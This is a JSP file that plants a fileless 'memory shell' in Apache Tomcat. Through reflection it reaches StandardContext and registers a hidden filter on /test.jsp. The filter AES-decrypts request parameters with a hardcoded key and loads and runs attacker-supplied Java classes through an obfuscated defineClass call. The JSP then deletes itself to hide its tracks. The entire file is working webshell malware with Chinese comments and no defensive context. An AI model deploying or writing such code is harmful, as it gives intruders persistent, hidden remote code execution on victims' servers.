<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<!-- tomcat 8/9 -->
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>

<!-- tomcat 7 -->
<%--<%@ page import="org.apache.catalina.deploy.FilterMap" %>--%>
<%--<%@ page import="org.apache.catalina.deploy.FilterDef" %>--%>

<%@ page import="java.util.*,javax.crypto.*,java.lang.reflect.*,javax.servlet.*,java.util.regex.Pattern,java.io.*,org.apache.catalina.*,org.apache.catalina.core.*"%>

<%
    class F implements Filter {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {}
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            List<Object> myContext = new ArrayList<>();
            myContext.add(servletResponse);
            String k="e10adc3949ba59ab";// aes密钥 123456 md5的前16位
            String read = "";
            Map map = request.getParameterMap();    // 取密文
            Set<Map.Entry> entrySet = map.entrySet();
            for (Map.Entry entry : entrySet) {
                read += ((String[]) entry.getValue())[0];
            }
            byte[] cText = new sun.misc.BASE64Decoder().decodeBuffer(read);
            byte[] mText; // 解密后的明文
            try {
                Cipher c=Cipher.getInstance("AES");
                c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES"));
                mText = c.doFinal(cText);
                String sText = new String(mText);
                if (Pattern.matches("[\\w.]{1,40}@.+", sText)) {
                    String first = sText.substring(0, sText.indexOf('@'));
                    String seconed = sText.substring(sText.indexOf('@') + 1);
                    myContext.add(seconed);
                    Class.forName(first).newInstance().equals(myContext);
                    return;
                }
                HttpSession session = request.getSession();
                if (mText[0] == -54 && mText[1] == -2 && mText[2] == -70 && mText[3] == -66) {
                    session.setAttribute("k", mText);
                } else if (session.getAttribute("k") != null) {
                    byte[] org = (byte[]) session.getAttribute("k");
                    byte[] tmp = new byte[org.length + mText.length];
                    System.arraycopy(org, 0, tmp, 0, org.length);
                    System.arraycopy(mText, 0, tmp, org.length, mText.length);
                    session.setAttribute("k", tmp);
                }
                try {
                    byte[] data = (byte[]) session.getAttribute("k");
                    Method m = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,67,108,97,115,115}), byte[].class, int.class, int.class);
                    m.setAccessible(true);
                    ((Class) m.invoke(this.getClass().getClassLoader(), data, 0, data.length)).newInstance().equals(myContext);
                    session.setAttribute("k", null);
                } catch (Exception e)  {
                    return;
                }
            } catch (Exception e) {
                filterChain.doFilter(servletRequest, servletResponse);
            }
        }
        @Override
        public void destroy() {}
    }
%>


<%
    ServletContext servletContext =  request.getSession().getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);
    String name = "F";//Filter注册名
    if (filterConfigs.get(name) == null){
        F filter = new F();
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        filterDef.setFilter(filter);
        standardContext.addFilterDef(filterDef);
        FilterMap filterMap = new FilterMap();
        // filterMap.addURLPattern("/*");
        filterMap.addURLPattern("/test.jsp"); // 对某目录filter
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap);
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
        filterConfigs.put(name,filterConfig);
        out.write("Success!");
    }
    else{
        out.write("Injected!");
    }
    new File(application.getRealPath(request.getServletPath())).delete(); //执行后删除自身
%>